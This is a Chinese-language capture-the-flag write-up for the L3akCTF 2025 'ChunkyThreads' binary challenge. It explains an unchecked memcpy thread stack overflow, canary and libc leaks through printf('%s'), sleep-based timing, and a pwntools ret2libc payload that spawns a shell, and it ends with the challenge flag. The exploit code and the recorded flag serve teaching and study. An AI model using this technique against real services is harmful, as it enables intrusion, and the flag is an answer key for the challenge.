# L3akCTF 2025 ChunkyThreads Writeup

## 题目简述

ChunkyThreads 接收 `CHUNKS` 和 `CHUNK` 命令并为每个名称启动打印线程。线程函数把可控长度的数据复制进 64 字节栈缓冲区，却不检查长度。程序启用了 stack canary 和 NX，因此需要先借助 `%s` 的越界打印泄漏 canary 与 libc 返回地址，再在新的线程中构造 ret2libc。

线程的睡眠时间同样是利用链的一部分：前两个泄漏线程故意休眠很久，避免它们带着已损坏的 canary 返回；最终利用线程只休眠 1 秒，让它迅速返回到 ROP 链。

## 解题过程

### 找到线程栈溢出

每条 `CHUNK` 命令会设置一个全局参数结构：

```c
typedef struct printarg {
    unsigned int sleeptime;
    unsigned int ntimes;
    char *name;
    size_t len;
} printarg_t;
```

线程函数包含：

```c
char name[64] = {0};
printarg_t *pa = (printarg_t *)arg;

memcpy(name, pa->name, pa->len);
while (cnt--) {
    printf("%s\n", name);
    sleep(sl);
}
```

`pa->len` 直接由本次 `read()` 的总长度减去命令前缀得到，没有上限。保护情况为 Full RELRO、canary、NX、No PIE。缓冲区后还有 8 字节编译器填充，因此 canary 起点距 `name`：

```text
64 + 8 = 72 bytes
```

### 泄漏 canary

先允许创建 4 个线程：

```python
io.sendline(b"CHUNKS 4")
io.recvline()
```

发送 73 个 `A`：

```python
io.send(b"CHUNK 999 1 " + b"A" * 73)
line = io.recvline().strip()
```

前 72 字节覆盖到 canary 之前，第 73 个 `A` 覆盖 canary 原本为零的最低字节。`printf("%s")` 因而不会在此停止，而会继续输出 canary 剩余的 7 字节和后续栈内容。

官方脚本按输出尾部结构取出这 7 个字节：

```python
canary_tail = line[-13:-6]
assert len(canary_tail) == 7
```

真正的 canary 应理解为：

```python
real_canary = b"\x00" + canary_tail
```

泄漏线程的 `sleeptime` 设为 999 秒，使其打印后留在 `sleep()` 中，不会立即执行函数尾部的 canary 检查。

### 泄漏 libc 返回地址

第二个线程用 88 个 `A` 覆盖：

```text
72 字节缓冲区与填充
+ 8 字节 canary
+ 8 字节保存的 RBP
```

于是 `%s` 会继续打印该线程栈上的 6 字节返回地址：

```python
io.send(b"CHUNK 999 1 " + b"A" * 88)
line = io.recvline().strip()
thread_ret = u64(line[-6:].ljust(8, b"\x00"))
```

对题目所附 `libc.so.6`，该返回地址位于 libc 基址偏移 `0x9caa4`：

```python
libc.address = thread_ret - 0x9caa4
```

这个偏移与随题提供的 libc 版本绑定；若运行环境更换了 libc，必须重新确认线程启动包装函数中的返回位置。

### 构造 ret2libc

从配套 libc 中查找 `/bin/sh`、`system` 和一个单独的 `ret` 对齐 gadget：

```python
rop = ROP(libc)
bin_sh = next(libc.search(b"/bin/sh\x00"))
ret = rop.find_gadget(["ret"]).address

rop.raw(ret)
rop.system(bin_sh)
```

最终线程改用 1 秒睡眠。payload 要恢复完整 canary，并让 ROP 链从保存的返回地址位置开始：

```python
tail_as_int = u64(canary_tail.ljust(8, b"\x00"))

payload = (
    b"CHUNK 1 1 "
    + b"A" * 72
    + b"\x00"
    + p64(tail_as_int)
    + p64(0)[:-1]
    + rop.chain()
)
io.send(payload)
```

这里看似多出的 1 字节有明确作用。`b"\x00" + p64(tail_as_int)` 的前 8 字节恢复真实 canary；`p64(tail_as_int)` 最后的补零开始覆盖保存的 RBP，再由后续 7 个零字节补齐。

线程打印一次名称并睡眠 1 秒，返回时 canary 校验通过，随后执行：

```text
ret
system("/bin/sh")
```

获得 shell 后读取：

```bash
cat /flag.txt
```

得到：

```text
L3AK{m30w_m30w_1n_th3_d4rk_y0u_c4n_r0p_l1k3_th4t_c4t}
```

仓库同时提供了源码、对应 libc 和官方 exploit。当前 WSL 的动态加载器与该 libc 的 ABI 组合不兼容，因此本文没有把本机加载失败误记为 exploit 失败；上述泄漏切片、`0x9caa4` 偏移和最终 ROP 均以题目配套运行环境为准。

## 方法总结

本题把普通线程栈溢出与调度时序结合起来。`memcpy()` 造成越界，`printf("%s")` 把越界变成信息泄漏，而可控 `sleep()` 又阻止带有损坏 canary 的泄漏线程过早返回。最后在第三个线程中恢复 canary并执行 ret2libc。

多线程题中，每个线程都有独立栈，但同一进程创建的线程通常继承相同的 stack guard 值，并共享 libc 映射。因此前一个线程泄漏的 canary 与 libc 基址可以供后一个线程利用。复现时还必须使用题目配套 libc；“地址看起来像 libc”并不足以证明偏移可跨版本复用。
